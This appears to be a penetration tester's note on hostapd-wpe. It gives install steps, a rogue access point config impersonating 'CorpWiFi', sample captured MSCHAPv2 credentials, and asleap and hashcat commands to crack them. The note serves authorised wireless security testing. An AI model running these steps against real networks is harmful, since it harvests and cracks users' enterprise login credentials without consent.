---
tags: [pentest, wireless, enterprise, hostapd-wpe, radius, both, initial-access]
tool: hostapd-wpe
phase: 5
---
# hostapd-wpe

Patched version of hostapd that acts as a rogue RADIUS server. The original tool for enterprise WiFi credential harvesting. EAPHammer is built on top of this.

[[10 - Wireless/00 - README|Folder index]]

## Install / verify

```bash
sudo apt install hostapd-wpe
# Config at /etc/hostapd-wpe/hostapd-wpe.conf
```

## Configure

Edit `/etc/hostapd-wpe/hostapd-wpe.conf`:

```ini
interface=wlan0
ssid=CorpWiFi
channel=6
hw_mode=g

# EAP settings
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
```

## Run

```bash
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

Captured credentials appear in the terminal:

```text
mschapv2: Mon May 18 10:00:00 2026
  username: jsmith
  challenge: aa:bb:cc:dd:ee:ff:00:11
  response: 11:22:33:44:55:66:77:88:99:aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88
```

## Crack the hash

```bash
# asleap (fast for single hashes)
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt

# hashcat (GPU, for many hashes)
# Format: username::::response:challenge
hashcat -m 5500 hashes.txt rockyou.txt
```

## When to use hostapd-wpe vs EAPHammer

| Scenario | Tool |
| --- | --- |
| Quick credential capture, manual setup OK | hostapd-wpe |
| Need karma mode, GUI, automation | [[18 - EAPHammer Enterprise]] |
| CTF or lab environment | Either works |

## See also

- [[18 - EAPHammer Enterprise]]
- [[15 - Evil Twin (wifiphisher)]]
